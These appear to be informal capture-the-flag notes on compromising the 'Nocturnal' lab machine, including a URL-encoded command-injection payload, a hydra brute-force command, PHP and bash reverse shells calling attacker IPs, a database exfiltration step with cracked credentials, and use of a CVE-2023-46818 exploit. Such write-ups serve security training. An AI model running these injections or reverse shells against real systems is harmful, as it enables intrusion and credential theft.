
Machine IP:

10.129.233.107



nocturnal.htb is the domain


From my initial NMAP scan i see a Nginx web server and ssh open. I have not fully TCP ports or scanned for UDP.



## WEB SERVER

The front page is here. however it seems I must register a user in order to go further with this. I believe steps are gonna be finding a vuln in the upload function. Which will require footprinting what library/service they are using to do this

## Why Use Nocturnal?

- **Seamless Uploads:** Easily upload Word, Excel, and PDF documents with just a few clicks.

Lets fuzz subdomains rq to see if theres anything we are missing

```
ffuf -u http://10.129.233.107 -H "Host: FUZZ.nocturnal.htb" -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Shows nothing




when I open burpsuite I see that this is a php site so if I have to fuzz Ill keep in mind that some files might be .php extension



After registering and logging in I see it redirects me to dashboard.php which when its loading sends a request 

POST /v1/leaks:lookupSingle HTTP/1.1
Host: passwordsleakcheck-pa.googleapis.com
Content-Length: 45
X-Goog-Api-Key: dummytoken
Content-Type: application/x-protobuf
Sec-Fetch-Site: none
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


sOGÀ!öêF"dªveË{M·ÓÈDRKhë3 



this is protobuf data 


**Inspect Protobuf**: You might need to decode or analyze the protobuf data in the request body to understand what it represents or how it can be manipulated. There are tools and libraries (e.g., `protobuf` in Python) that can help you decode this if you have the schema or the structure.


However this request returns invalid api key. I but that protobuf data is something intresting


It doesnt seem this a real google subdomain. SO maybe This is a hint to look for .proto files as well as .php files


when i create a .docx file with the content whoami it uploads and then i can go to 



http://nocturnal.htb/view.php?username=hackeruser123&file=../../../etc/passwd.pdf


I can get any file from the system with the extensions .docx or .pdf 



NVM THERES XSS LOL

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Apr 2025 17:15:48 GMT
Content-Type: application/octet-stream
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Disposition: attachment; filename="test.docx"
Content-Length: 2926

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View File</title>
    <style>
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            background-color: #1c1f26;
            margin: 0;
            padding: 0;
            color: #e0e0e0;
            line-height: 1.7;
            font-size: 18px;
            transition: background-color 0.5s ease;
        }

        .container {
            max-width: 800px;
            margin: 60px auto;
            padding: 40px;
            background-color: #2a2d38;
            border-radius: 12px;
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.25);
            transition: transform 0.3s ease;
        }

        .container:hover {
            transform: translateY(-10px);
        }

        h1, h2 {
            color: #f1c40f;
            text-align: center;
            font-weight: 600;
            letter-spacing: 1px;
            margin-bottom: 25px;
            transition: color 0.3s ease;
        }

        h1 {
            font-size: 3em;
        }

        h2 {
            font-size: 2.2em;
        }

        ul {
            list-style-type: none;
            padding: 0;
        }

        li {
            background-color: #2e333d;
            padding: 20px;
            margin-bottom: 15px;
            border: 1px solid #444;
            border-radius: 8px;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
        }

        li:hover {
            background-color: #3b404b;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        a {
            color: #f39c12;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s ease;
        }

        a:hover {
            color: #e67e22;
            text-decoration: underline;
        }

        .error {
            color: #e74c3c;
            font-weight: bold;
            border: 1px solid #e74c3c;
            background-color: #3b2023;
            padding: 12px;
            border-radius: 6px;
        }

        .success {
            color: #2ecc71;
            font-weight: bold;
            border: 1px solid #2ecc71;
            background-color: #203b30;
            padding: 12px;
            border-radius: 6px;
        }

        .logout {
            margin-top: 40px;
            text-align: center;
            font-weight: bold;
            color: #95a5a6;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(32,40,51,1) 0%, rgba(28,31,40,1) 100%);
            z-index: -1;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>File Viewer</h1>

    whoami


LOOK AT THE BOTTOM WHEN U UPLAOD THE FILE IT RENDERS IT AS A HTML ELEMENT SO ITS REFLECTED LETS SEE IF WE CAN GET XSS



admin.php forwards to login


also lets check what extensions we can use 


extension-test.txt


i /home/skid/SecLists/Fuzzing



and lets fuzz for directories



404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       21l       45w      644c http://nocturnal.htb/login.php
200      GET      161l      327w     3105c http://nocturnal.htb/style.css
302      GET        0l        0w        0c http://nocturnal.htb/admin.php => login.php
200      GET       21l       45w      649c http://nocturnal.htb/register.php
200      GET       29l      145w     1524c http://nocturnal.htb/
302      GET        0l        0w        0c http://nocturnal.htb/logout.php => login.php
403      GET        7l       10w      162c http://nocturnal.htb/uploads
200      GET       29l      145w     1524c http://nocturnal.htb/index.php
302      GET      123l      236w     2919c http://nocturnal.htb/view.php => login.php
301      GET        7l       12w      178c http://nocturnal.htb/backups => http://nocturnal.htb/backups/
302      GET        0l        0w        0c http://nocturnal.htb/dashboard.php => login.php
403      GET        7l       10w      162c http://nocturnal.htb/uploads_admin
403      GET        7l       10w      162c http://nocturnal.htb/uploads_user
403      GET        7l       10w      162c http://nocturnal.htb/uploads_group
403      GET        7l       10w      162c http://nocturnal.htb/uploads2
403      GET        7l       10w      162c http://nocturnal.htb/uploads_video
403      GET        7l       10w      162c http://nocturnal.htb/uploads_forum
403      GET        7l       10w      162c http://nocturnal.htb/uploads_event
403      GET        7l       10w      162c http://nocturnal.htb/uploads3
403      GET        7l       10w      162c http://nocturnal.htb/uploads7
403      GET        7l       10w      162c http://nocturnal.htb/uploads_files
403      GET        7l       10w      162c http://nocturnal.htb/uploads6
403      GET        7l       10w      162c http://nocturnal.htb/uploads_game
403      GET        7l       10w      162c http://nocturnal.htb/uploads5
403      GET        7l       10w      162c http://nocturnal.htb/uploads_vid
403      GET        7l       10w      162c http://nocturnal.htb/uploads4



welp I shoulda done that earlier



oh also i see that username is reflected so maybe xss there?

Lets take a look at what pages we are authed to and follow redirects


feroxbuster -u http://nocturnal.htb \
-w Discovery/Web-Content/raft-large-directories.txt \
-x php \
-H "Cookie: PHPSESSID=0v3tc3uk83lm7ei3trmccjvnbu" \
--redirects 


200      GET      161l      327w     3105c http://nocturnal.htb/style.css
200      GET       21l       45w      649c http://nocturnal.htb/register.php
200      GET       21l       45w      644c http://nocturnal.htb/login.php
200      GET       29l      145w     1524c http://nocturnal.htb/
403      GET        7l       10w      162c http://nocturnal.htb/uploads
200      GET       29l      145w     1524c http://nocturnal.htb/index.php
403      GET        7l       10w      162c http://nocturnal.htb/backups/
403      GET        7l       10w      162c http://nocturnal.htb/uploads_admin
403      GET        7l       10w      162c http://nocturnal.htb/uploads_user
403      GET        7l       10w      162c http://nocturnal.htb/uploads_group
403      GET        7l       10w      162c http://nocturnal.htb/uploads2
403      GET        7l       10w      162c http://nocturnal.htb/uploads_video
403      GET        7l       10w      162c http://nocturnal.htb/uploads_event
403      GET        7l       10w      162c http://nocturnal.htb/uploads_forum
403      GET        7l       10w      162c http://nocturnal.htb/uploads3
403      GET        7l       10w      162c http://nocturnal.htb/uploads4
403      GET        7l       10w      162c http://nocturnal.htb/uploads5
403      GET        7l       10w      162c http://nocturnal.htb/uploads6
403      GET        7l       10w      162c http://nocturnal.htb/uploads_files
403      GET        7l       10w      162c http://nocturnal.htb/uploads7
403      GET        7l       10w      162c http://nocturnal.htb/uploads_vid
403      GET        7l       10w      162c http://nocturnal.htb/uploads_game


it looks like we dont have access to anything. Lets look at this xss vector through username and if not im using rockyou on the login page...


no xss its reflected by html escaped 



hydra -l admin -P rockyou.txt nocturnal.htb http-post-form \ 
"/login.php:username=^USER^&password=^PASS^:Invalid username or password"
\

alr so ima just try to bruteforce the admin login i guess unless im missing something 



or wait.. since i have that lfi which i can only do certain extensions maybe i should try to read a file in backups/



Ok well fuzzing for admin doesnt work





Lets try to fuzz for other usernames with that LFI we found earlier

.

While browsing over this something stook out to me. The fact that it says
## Available files for download:

and when I put a made up file with a valid extension it shows me the available files for downloads for that user 


So all I have to do is fuzz for GET /view.php?username=test&file=a.docx  

all i have to fuzz for is the usernames and find a valid username with no files. This confused me for so long as I assumed admin would have files. 

I also must include my PHP-SESSION cookie

Cookie: PHPSESSID=sioupe2kjtimrmfok1aq2rk924


ffuf -w SecLists/Usernames/xato-net-10-million-usernames.txt -u "http://nocturnal.htb/view.php?username=FUZZ&file=a.docx" -H "Cookie: PHPSESSID=sioupe2kjtimrmfok1aq2rk924" -ac


this finds the amanda and tobias users.

when i then enumerate amandas user using the method above by seeing available files we see privacy.odt 

while this was happening the machine kept crashing..


Once downloading the odt unzip it

unzip privacy.odt -d privacy-odt/


Inside of content.xml you will find

Temporary password: arHkG7HAI68X8s1J
User: amanda
arHkG7HAI68X8s1J


ssh no work so i gotta go to admin panel and get rce




Upon logging into amandas account I can now go to the admin panel which two things stand out

GET /admin.php?view=view.php  this then reponds by wrapping the file into a html </pre> element.  since i dont think this is filtered im sure i can read maybe a ssh key or something

So i can only read PHP files .php files  My guess right now is i can somehow upload a php reverse shell or maybe a web shell and then have it run through as php instead of just being rendered as html. Maybe i need to escape the tag somehow.

also man this machine was acting so slow. its so frustarating when your trying to do something and the connection just sucks and every 10 minutes the machine stops working for 5 mins

I can read the admin.php file and find

$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";

so the password file is directly used in the command. Command injection lol 


Upon looking at the create backup I set the password bash -c "whoami"  and then url encode it


password=%0Abash%09-c%09"whoami"%0A&backup=Create+Backup


php -r '$sock=fsockopen("10.10.14.35",1337);exec("sh <&3 >&3 2>&3");'


The rev shell wasnt working and with a little work and ALOT of directory fuzzing I was able to get the database file

password=%0Abash%09-c%09"base64%09/var/www/nocturnal_database/nocturnal_database.db"%0A&backup=Create+Backup 

After base64 decoding it i see

Its in sqlite format so its a little hard to read but i see �Mtest098f6bcd4621d373cade4e832627b4f6B�IM<script>alert('test')</script>098f6bcd4621d373cade4e832627b4f61�'Mhackeruser123a791d28f2b7b3e8cb319d9fa13fc4e1e*�Mtobias55c82b1ccd55ab219b3b109b07d5061d*�Mamandadf8b20aa0c935023f99ea58358fb63c4)�Madmind725aeba143f575736b07e045d8ceebb what is the hases to each uses ALSO WHY IS EACH ONE HAVE A M before?? for example my user is test so tobias hash is 55c82b1ccd55ab219b3b109b07d5061d ?

|   |   |
|---|---|
|test|`098f6bcd4621d373cade4e832627b4f6`|

|   |   |
|---|---|
|hackeruser|`123a791d28f2b7b3e8cb319d9fa13fc4e1e`|

|   |   |
|---|---|
|tobias|`55c82b1ccd55ab219b3b109b07d5061d`|

|   |   |
|---|---|
|amanda|`df8b20aa0c935023f99ea58358fb63c4`|

|   |   |
|---|---|
|admin|`d725aeba143f575736b07e045d8ceebb`|



I crack tobias on crackstation and i find his password is 
slowmotionapocalypse


ssh tobias@nocturnal.htb 

pass is slowmotionapocalypse


then i upload linpeas 


Priv esc


╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.31



[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

I also see this

root         937  0.0  0.6 211568 26864 ?        Ss   Apr14   0:05 /usr/bin/php -S 127.0.0.1:8080
root         943  0.0  0.0   6816  3028 ?        Ss   Apr14   0:00 /usr/sbin/cron -f
root         946  0.0  0.6 212396 27840 ?        Ss   Apr14   0:08 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)


So root is running php locally under 8080


1. Create an `rev.sh` served on http server.
2. Run `curl` through RCE to upload
3. Run `bash rev.sh` to execute

6293



tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -


/home/tobias/.sqlite_history




I found a file that managing creating passwords or something. Thats what chatgpt told me

Since I see port 8080 running as root lets take a look at that

ssh -L 9090:localhost:8080 tobias@nocturnal.htb


It has a Login page for ISP config. Upon looking at some of the javascript a certain function stands out

function generatePassword(passwordFieldID, repeatPasswordFieldID){
	var oldPWField = jQuery('#'+passwordFieldID);
	oldPWField.removeAttr('readonly');
	var newPWField = oldPWField.clone();
	newPWField.attr('type', 'text').attr('id', 'tmp'+passwordFieldID).insertBefore(oldPWField);
	oldPWField.remove();
	var pword = password(8, false, 1);
	jQuery('#'+repeatPasswordFieldID).val(pword);
	jQuery('#'+repeatPasswordFieldID).removeAttr('readonly');
	newPWField.attr('id', passwordFieldID).val(pword).trigger('keyup').select();
	newPWField.unbind('keyup').on('keyup', function(e) {
		if($(this).val() != pword) {
			var pos = $(this).getCursorPosition();
			$(this).attr('type', 'password').unbind('keyup').setCursorPosition(pos);
		}
	});
}



The password is randomly generated using multipel characters Everytime the function runs AKA every time the page is loaded it produces a different password

After trying this for a while i realise there is a CVE for this

CVE-2023-46818

This took me so long because i kept trying to generate the password and bruteforce it when the creds are litterally 

admin : slowmotionapocalypse




 python3 exploit.py http://127.0.0.1:9090/ admin 
 
 https://github.com/bipbopbup/CVE-2023-46818-python-exploit/blob/main/exploit.py
 
 slowmotionapocalypse

Once you get the web shell upgrade it with


On attacker machine
nc -lvnp 4444


On VICTIM
bash -c "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"

